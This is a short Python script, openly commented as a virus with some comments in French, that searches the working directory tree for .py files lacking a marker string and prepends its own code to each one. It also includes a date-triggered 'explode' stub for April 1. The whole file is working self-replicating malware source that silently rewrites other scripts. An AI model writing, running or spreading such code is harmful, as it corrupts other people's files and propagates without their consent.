import os, datetime, inspect, time
DATA_TO_INSERT = "ELIOTT_TESSIER_0685259811"
def search(path): #search for target files in path 
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
        if os.path.isdir(path+"/"+filename): #If it is a folder 
            filestoinfect.extend(search(path+"/"+filename)) 
        elif filename[-3:] == ".py": #If it is a python script -> Infect it 
            infected = False #default value 
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                 filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
def infect(filestoinfect): #changes to be made in the target file 
    k = 0
    target_file = inspect.currentframe().f_code.co_filename #path vers le fichier py
    virus = open(os.path.abspath(target_file)) # lecture du contenue du virus
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: # nb ligne du virus
            virusstring += line # stockage contenue du virus (meme si pas le code originel)
    virus.close 
    for fname in filestoinfect: #récupération du code originelle du .py infecté
         f = open(fname) 
         temp = f.read() 
         f.close() 
         f = open(fname,"w") 
         f.write(virusstring + temp) #réecriture du fichier avec le virus en entête
         f.close() 
         k += 1
    return k
def explode(): #Not required actually... 
      if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1: 
            print ("")
filestoinfect = search(os.path.abspath("")) 
Infectnb = infect(filestoinfect)
print (Infectnb)
